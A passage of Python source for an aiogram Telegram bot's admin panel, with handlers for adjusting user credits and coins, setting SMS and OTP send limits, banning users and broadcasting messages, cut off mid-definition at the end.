async def u_addcr(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(addcr_uid=uid)
    await state.set_state(S.add_credits_amount)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b> to <code>{uid}</code>\n\n"
        f"Amount:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:addcoin:(\d+)$"))
async def u_addcoin(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(addcoin_uid=uid)
    await state.set_state(S.add_coins_amount)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Add Coins</b> to <code>{uid}</code>\n\n"
        f"Amount:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:dedcr:(\d+)$"))
async def u_dedcr(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(dedcr_uid=uid)
    await state.set_state(S.deduct_credits_amount)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b> from <code>{uid}</code>\n\n"
        f"Amount:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:dedcoin:(\d+)$"))
async def u_dedcoin(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(dedcoin_uid=uid)
    await state.set_state(S.deduct_coins_amount)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Deduct Coins</b> from <code>{uid}</code>\n\n"
        f"Amount:",
        kb([(sc("cancel"), back)]),
    )

# ---- add credits amount handler ----
@R.message(S.add_credits_amount)
async def addcr_amt(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send positive number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("addcr_uid")
    if uid is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    add_credits(uid, amt, d, True, f"admin-add-{m.from_user.id}")
    log_audit(d, "add_credits", m.from_user.id, f"uid={uid} amt={amt}")
    save()
    await state.clear()
    try:
        await m.bot.send_message(
            uid,
            f"💰 <b>+{amt} credits!</b>\nBalance: {get_user_credits(uid, d)}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} +{amt} credits → <code>{uid}</code>\n"
        f"New: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.message(S.add_coins_amount)
async def addcoin_amt(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send positive number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("addcoin_uid")
    if uid is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    add_coins(uid, amt, d, True, f"admin-add-{m.from_user.id}")
    log_audit(d, "add_coins", m.from_user.id, f"uid={uid} amt={amt}")
    save()
    await state.clear()
    try:
        await m.bot.send_message(
            uid,
            f"🪙 <b>+{amt} coins!</b>\nBalance: {get_user_coins(uid, d)}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} +{amt} coins → <code>{uid}</code>\n"
        f"New: <b>{get_user_coins(uid, d)}</b>",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.message(S.deduct_credits_amount)
async def dedcr_amt(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send positive number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("dedcr_uid")
    if uid is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    ok = deduct_credits(uid, amt, d, f"admin-ded-{m.from_user.id}")
    log_audit(d, "deduct_credits", m.from_user.id, f"uid={uid} amt={amt} ok={ok}")
    save()
    await state.clear()
    if ok:
        try:
            await m.bot.send_message(
                uid,
                f"⚠️ -{amt} credits. Balance: {get_user_credits(uid, d)}",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await m.answer(
            f"{em(EMOJI_CHECK, '✅')} -{amt} → <code>{uid}</code>\nNew: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )
    else:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient. Left: {get_user_credits(uid, d)}",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )

@R.message(S.deduct_coins_amount)
async def dedcoin_amt(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"{em(EMOJI_CROSS, '❌')} Send positive number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    uid = fsmd.get("dedcoin_uid")
    if uid is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    ok = deduct_coins(uid, amt, d, f"admin-ded-{m.from_user.id}")
    log_audit(d, "deduct_coins", m.from_user.id, f"uid={uid} amt={amt} ok={ok}")
    save()
    await state.clear()
    if ok:
        try:
            await m.bot.send_message(
                uid,
                f"⚠️ -{amt} coins. Balance: {get_user_coins(uid, d)}",
                parse_mode="HTML",
            )
        except Exception:
            pass
        await m.answer(
            f"{em(EMOJI_CHECK, '✅')} -{amt} coins → <code>{uid}</code>\nNew: <b>{get_user_coins(uid, d)}</b>",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )
    else:
        await m.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient. Left: {get_user_coins(uid, d)}",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )

# ============================================================
#  USER DETAIL — MESSAGE / NOTE / TAGS / LIMITS / PREMIUM
# ============================================================
@R.callback_query(F.data.regexp(r"^(owner|admin):u:msg:(\d+)$"))
async def u_msg(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(direct_msg_uid=uid)
    await state.set_state(S.direct_msg_text)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📩')} <b>Send Message</b> to <code>{uid}</code>\n\n"
        f"Type the message:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:note:(\d+)$"))
async def u_note(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(user_note_uid=uid)
    await state.set_state(S.user_note_text)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    cur = esc(str(d.get("user_notes", {}).get(str(uid), ""))[:100]) or "<i>(empty)</i>"
    await safe_edit(
        cq,
        f"{em(EMOJI_GEAR, '📝')} <b>Note</b> for <code>{uid}</code>\n\n"
        f"Current: {cur}\n\n"
        f"New note (or <code>clear</code>):",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.user_note_text)
async def u_note_save(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    target = fsmd.get("user_note_uid")
    if target is None:
        await state.clear()
        await m.answer(f"❌ Expired.", parse_mode="HTML")
        return
    txt = (m.text or "").strip()[:200]
    await state.clear()
    if txt.lower() in ("clear", "remove", "none", "-"):
        d.setdefault("user_notes", {}).pop(str(target), None)
        save()
        await m.answer(
            f"✅ Cleared.",
            reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
            parse_mode="HTML",
        )
        return
    d.setdefault("user_notes", {})[str(target)] = txt
    save()
    await m.answer(
        f"✅ Saved.",
        reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:tags:(\d+)$"))
async def u_tags(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(user_tag_uid=uid)
    await state.set_state(S.user_tag_text)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    cur = d.get("user_tags", {}).get(str(uid), [])
    cur_s = ", ".join(cur) if cur else "<i>(none)</i>"
    await safe_edit(
        cq,
        f"{em(EMOJI_TAG, '🏷')} <b>Tags</b> for <code>{uid}</code>\n\n"
        f"Current: {cur_s}\n\n"
        f"New tags (comma-separated, or <code>clear</code>):",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.user_tag_text)
async def u_tags_save(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    target = fsmd.get("user_tag_uid")
    if target is None:
        await state.clear()
        await m.answer(f"❌ Expired.", parse_mode="HTML")
        return
    raw = (m.text or "").strip()
    await state.clear()
    if raw.lower() in ("clear", "remove", "none", "-"):
        d.setdefault("user_tags", {})[str(target)] = []
        save()
        await m.answer(
            f"✅ Tags cleared.",
            reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
            parse_mode="HTML",
        )
        return
    tags = [t.strip()[:20] for t in raw.split(",") if t.strip()]
    d.setdefault("user_tags", {})[str(target)] = tags[:10]
    save()
    await m.answer(
        f"✅ Saved {len(tags)} tag(s).",
        reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:lim:(\d+)$"))
async def u_lim(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(limit_target_uid=uid)
    await state.set_state(S.set_limit_value)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    cur = get_user_send_limit(uid, d)
    cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else str(cur))
    await safe_edit(
        cq,
        f"{em(EMOJI_LOCK, '🔒')} <b>SMS Limit</b>\n\n"
        f"Current: <b>{cs}</b>\n\n"
        f"Send number, <code>0</code> to block, or <code>off</code> for unlimited:",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:otplim:(\d+)$"))
async def u_otplim(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    await state.update_data(otplimit_target_uid=uid)
    await state.set_state(S.set_otp_limit_value)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    cur = get_user_otp_limit(uid, d)
    cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else str(cur))
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>OTP Limit</b>\n\n"
        f"Current: <b>{cs}</b>\n\n"
        f"Send number, <code>0</code> to block, or <code>off</code> for unlimited:",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.set_limit_value)
async def set_limit_val(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    txt = (m.text or "").strip().lower()
    fsmd = await state.get_data()
    target = fsmd.get("limit_target_uid")
    if target is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if txt in ("off", "unlimited", "remove", "none", "reset"):
        set_user_send_limit(target, None, d)
        save()
        await state.clear()
        await m.answer(f"✅ Unlimited", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    try:
        lv = int(txt)
        if lv < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Invalid.", parse_mode="HTML")
        return
    set_user_send_limit(target, lv, d)
    log_audit(d, "set_sms_limit", m.from_user.id, f"uid={target} val={lv}")
    save()
    await state.clear()
    await m.answer(
        f"✅ <code>{target}</code> → {lv}",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.message(S.set_otp_limit_value)
async def set_otplimit_val(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d) and not is_admin(m.from_user.id, d):
        await state.clear()
        return
    txt = (m.text or "").strip().lower()
    fsmd = await state.get_data()
    target = fsmd.get("otplimit_target_uid")
    if target is None:
        await state.clear()
        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if txt in ("off", "unlimited", "remove", "none", "reset"):
        set_user_otp_limit(target, None, d)
        save()
        await state.clear()
        await m.answer(f"✅ Unlimited", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    try:
        lv = int(txt)
        if lv < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Invalid.", parse_mode="HTML")
        return
    set_user_otp_limit(target, lv, d)
    log_audit(d, "set_otp_limit", m.from_user.id, f"uid={target} val={lv}")
    save()
    await state.clear()
    await m.answer(
        f"✅ <code>{target}</code> → {lv}",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:premium:(\d+)$"))
async def u_premium_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    uid = int(cq.data.split(":")[-1])
    k = str(uid)
    cur = d.get("users", {}).get(k, {}).get("premium", False)
    new = not cur
    d.setdefault("users", {}).setdefault(k, {})["premium"] = new
    save()
    try:
        await cq.answer(f"💎 Premium: {'ON' if new else 'OFF'}", show_alert=True)
    except Exception:
        pass
    prefix = cq.data.split(":")[0]
    await safe_edit(cq, _user_detail(d, uid), _user_detail_kb(uid, d, prefix))

# ============================================================
#  BAN / UNBAN
# ============================================================
@R.callback_query(F.data.regexp(r"^(owner|admin):u:ban:(\d+)$"))
async def u_ban(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    target = int(cq.data.split(":")[-1])
    if is_owner(target, d) or is_admin(target, d):
        try:
            await cq.answer("❌ Cannot ban admin!", show_alert=True)
        except Exception:
            pass
        return
    await state.update_data(ban_target=target)
    await state.set_state(S.ban_user_reason)
    back = "owner:home" if is_owner(uid, d) else "admin:home"
    await safe_edit(
        cq,
        f"🚫 <b>Ban</b> <code>{target}</code>\n\n"
        f"Send reason (or <code>skip</code>):",
        kb([(sc("cancel"), back)]),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):u:unban:(\d+)$"))
async def u_unban(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    target = int(cq.data.split(":")[-1])
    if target in d.get("banned", []):
        d["banned"].remove(target)
    d.get("ban_reasons", {}).pop(str(target), None)
    save()
    try:
        await cq.answer("✅ Unbanned!", show_alert=True)
    except Exception:
        pass
    prefix = cq.data.split(":")[0]
    try:
        await cq.bot.send_message(target, f"✅ Unbanned.", parse_mode="HTML")
    except Exception:
        pass
    await safe_edit(cq, _user_detail(d, target), _user_detail_kb(target, d, prefix))

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"🚫 <b>Ban</b>\n\nSend Telegram user ID:",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.ban_user)
async def ban_uid(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        bid = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Invalid ID.", parse_mode="HTML")
        return
    if is_owner(bid, d) or is_admin(bid, d):
        await state.clear()
        await m.answer(f"❌ Cannot ban admin!", parse_mode="HTML")
        return
    await state.update_data(ban_target=bid)
    await state.set_state(S.ban_user_reason)
    back = "owner:home" if is_owner(uid, d) else "admin:home"
    await m.answer(
        f"Send reason (or <code>skip</code>):",
        reply_markup=kb([(sc("cancel"), back)]),
        parse_mode="HTML",
    )

@R.message(S.ban_user_reason)
async def ban_reason(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    fsmd = await state.get_data()
    bid = fsmd.get("ban_target")
    reason = (m.text or "").strip()
    if reason.lower() == "skip":
        reason = ""
    await state.clear()
    if bid is None:
        await m.answer(f"❌ Expired.", parse_mode="HTML")
        return
    if bid not in d.get("banned", []):
        d.setdefault("banned", []).append(bid)
    if reason:
        d.setdefault("ban_reasons", {})[str(bid)] = reason[:200]
    log_audit(d, "ban_user", uid, f"target={bid} reason={reason}")
    save()
    bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await m.answer(
        f"🚫 Banned <code>{bid}</code>",
        reply_markup=bk,
        parse_mode="HTML",
    )
    try:
        rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
        await m.bot.send_message(bid, f"🚫 <b>Banned.</b>{rtxt}", parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    banned = d.get("banned", [])
    if not banned:
        try:
            await cq.answer("✅ No banned users")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await safe_edit(
        cq,
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban</b>\n\nBanned: <b>{len(banned)}</b>",
        unban_menu_kb(d, prefix),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    bid = int(cq.data.split(":")[-1])
    if bid in d.get("banned", []):
        d["banned"].remove(bid)
    d.get("ban_reasons", {}).pop(str(bid), None)
    log_audit(d, "unban", uid, f"target={bid}")
    save()
    try:
        await cq.answer("✅ Unbanned!", show_alert=True)
    except Exception:
        pass
    try:
        await cq.bot.send_message(bid, f"✅ Unbanned.", parse_mode="HTML")
    except Exception:
        pass
    await _render_home(cq, state, skip_fj=True)

# ============================================================
#  BROADCAST
# ============================================================
@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def bc_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n"
        f"Send the message to broadcast to all users:",
        kb([(sc("cancel"), back)]),
    )

@R.message(S.broadcast)
async def bc_do(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = None
    try:
        wait = await m.answer(f"📤 Sending to <b>{len(users)}</b>...", parse_mode="HTML")
    except Exception:
        pass
    ok = 0
    fail = 0
    for us in list(users.keys()):
        try:
            t = int(us)
            if m.text:
                await m.bot.send_message(t, f"📢 <b>Broadcast</b>\n\n{esc(m.text)}", parse_mode="HTML")
            else:
                await m.copy_to(t)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    if wait:
        try:
            await wait.delete()
        except Exception:
            pass
    bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    log_audit(d, "broadcast", uid, f"ok={ok} fail={fail}")
    save()
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Broadcast done!\n✅ {ok} | ❌ {fail}",
        reply_markup=bk,
        parse_mode="HTML",
    )

# ============================================================
#  ADD / DEDUCT ALL
# ============================================================
@R.callback_query(F.data == "owner:add_all_credits")
async def add_all_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_all_credits_amount)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💰')} <b>Add credits to ALL users</b>\n\n"
        f"Amount:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.add_all_credits_amount)
async def add_all_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt <= 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Positive number.", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await m.answer(f"❌ No users.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    for us in list(users.keys()):
        add_credits(int(us), amt, d, True, "admin-add-all")
    log_audit(d, "add_credits_all", uid, f"amt={amt} count={len(users)}")
    save()
    note = f"{em(EMOJI_MONEY, '💰')} <b>+{amt} credits!</b>"
    okc = 0
    for us in list(users.keys()):
        try:
            await m.bot.send_message(int(us), note, parse_mode="HTML")
            okc += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} {amt} × {len(users)}\nNotified: {okc}",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:deduct_all_credits")
async def deduct_all_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.deduct_all_credits_amount)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct credits from ALL</b>\n\n"
        f"Amount (only manual-added pool):",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.deduct_all_credits_amount)
async def deduct_all_amt(m: Message, state: FSMContext):
    d = load()
    uid = m.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amt = int((m.text or "").strip())
        if amt < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.clear()
    cnt = 0
    tot = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for us, ud in d.get("users", {}).items():
        iu = int(us)
        if iu in owners or iu in admins:
            continue
        cur = ud.get("credits", 0)
        man = ud.get("manual_added_credits", 0)
        pool = max(0, cur - man)
        if pool > 0:
            td = min(amt, pool)
            if td > 0:
                ud["credits"] = cur - td
                cnt += 1
                tot += td
    log_audit(d, "deduct_credits_all", uid, f"amt={amt} got={tot} from={cnt}")
    save()
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Deducted <b>{tot}</b> from <b>{cnt}</b> users.",
        reply_markup=owner_kb(d),
        parse_mode="HTML",
    )

# ============================================================
#  LIMITS — direct user id
# ============================================================
@R.callback_query(F.data == "owner:set_limit")
async def set_limit_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_limit_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_LOCK, '🔒')} <b>SET SMS LIMIT</b>\n\nUser ID:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.set_limit_uid)
async def set_limit_uid_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        target = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Numeric ID.", parse_mode="HTML")
        return
    if str(target) not in d.get("users", {}):
        await m.answer(f"❌ User not found.", parse_mode="HTML")
        return
    await state.update_data(limit_target_uid=target)
    cur = get_user_send_limit(target, d)
    cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else f"{cur}")
    await state.set_state(S.set_limit_value)
    await m.answer(
        f"{em(EMOJI_LOCK, '🔒')} Current: <b>{cs}</b>\n\n"
        f"Send number, <code>0</code> to block, or <code>off</code>:",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:set_otp_limit")
async def set_otplimit_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_otp_limit_uid)
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>SET OTP LIMIT</b>\n\nUser ID:",
        kb([(sc("cancel"), "owner:home")]),
    )

@R.message(S.set_otp_limit_uid)
async def set_otplimit_uid_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        target = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Numeric ID.", parse_mode="HTML")
        return
    if str(target) not in d.get("users", {}):
        await m.answer(f"❌ User not found.", parse_mode="HTML")
        return
    await state.update_data(otplimit_target_uid=target)
    cur = get_user_otp_limit(target, d)
    cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else f"{cur}")
    await state.set_state(S.set_otp_limit_value)
    await m.answer(
        f"{em(EMOJI_OTP, '🔐')} Current: <b>{cs}</b>\n\n"
        f"Send number, <code>0</code> to block, or <code>off</code>:",
        reply_markup=kb([(sc("cancel"), "owner:home")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:list_limits")
async def list_limits(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    lines = [f"{em(EMOJI_LOCK, '📋')} <b>All Limits</b>\n"]
    count = 0
    for us, u in d.get("users", {}).items():
        lim = u.get("max_send_limit")
        olim = u.get("max_otp_limit")
        if lim is None and olim is None:
            continue
        count += 1
        nm = esc(str(u.get("name", "?"))[:18])
        ls = "∞" if lim is None else ("🚫" if lim <= 0 else str(lim))
        os_ = "∞" if olim is None else ("🚫" if olim <= 0 else str(olim))
        lines.append(
            f"👤 <code>{us}</code> {nm}\n"
            f"   SMS: <b>{ls}</b> | OTP: <b>{os_}</b>"
        )
    if count == 0:
        lines.append("<i>No limits set.</i>")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "owner:home")]))

# ============================================================
#  FORCE JOIN — main menu
# ============================================================
@R.callback_query(F.data == "owner:fj:menu")
